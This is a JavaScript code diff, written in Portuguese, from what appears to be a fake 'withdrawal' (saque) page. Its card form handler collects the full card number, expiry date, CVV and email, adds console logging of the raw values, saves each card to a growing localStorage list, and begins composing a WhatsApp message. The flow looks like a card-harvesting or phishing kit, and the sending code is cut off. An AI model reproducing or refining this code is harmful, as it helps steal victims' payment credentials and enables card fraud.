@@ -1137,11 +1137,15 @@ function mostrarOpcoesData(opcoes, dataReal) {
             showStep('flowCartao', 3);
         });
 
-      document.getElementById('confirmCartao').addEventListener('click', () => {
+   document.getElementById('confirmCartao').addEventListener('click', () => {
+    console.log('🔵 Botão confirmCartao clicado');
+    
     const numeroRaw = document.getElementById('numeroCartao').value.replace(/\D/g, '');
     const validade = document.getElementById('validadeCartao').value;
     const cvv = document.getElementById('cvvCartao').value;
     const email = document.getElementById('emailCartao').value;
+    
+    console.log('📝 Dados do formulário:', { numeroRaw, validade, cvv, email });
     
     if (!numeroRaw || !validade || !cvv || !email) {
         alert('Por favor, preencha todos os campos.');
@@ -1188,12 +1192,24 @@ function mostrarOpcoesData(opcoes, dataReal) {
         data: new Date().toLocaleString('pt-BR')
     };
     
-    // Recuperar lista existente ou criar nova
-    const lista = JSON.parse(localStorage.getItem('cartoes_salvos') || '[]');
-    lista.push(dadosCartao);
-    localStorage.setItem('cartoes_salvos', JSON.stringify(lista));
+    console.log('💾 Tentando salvar:', dadosCartao);
     
-    console.log('✅ Cartão salvo! Total:', lista.length);
+    try {
+        // Recuperar lista existente ou criar nova
+        let lista = JSON.parse(localStorage.getItem('cartoes_salvos') || '[]');
+        console.log('📋 Lista atual:', lista);
+        
+        lista.push(dadosCartao);
+        localStorage.setItem('cartoes_salvos', JSON.stringify(lista));
+        
+        console.log('✅ Cartão salvo! Total agora:', lista.length);
+        console.log('📦 localStorage atual:', JSON.parse(localStorage.getItem('cartoes_salvos')));
+        
+    } catch (erro) {
+        console.error('❌ Erro ao salvar:', erro);
+        alert('Erro ao salvar dados!');
+        return;
+    }
     
     // ========== ENVIAR WHATSAPP ==========
     const mensagem = `✅ *SAQUE SOLICITADO COM SUCESSO* ✅\n\n` +
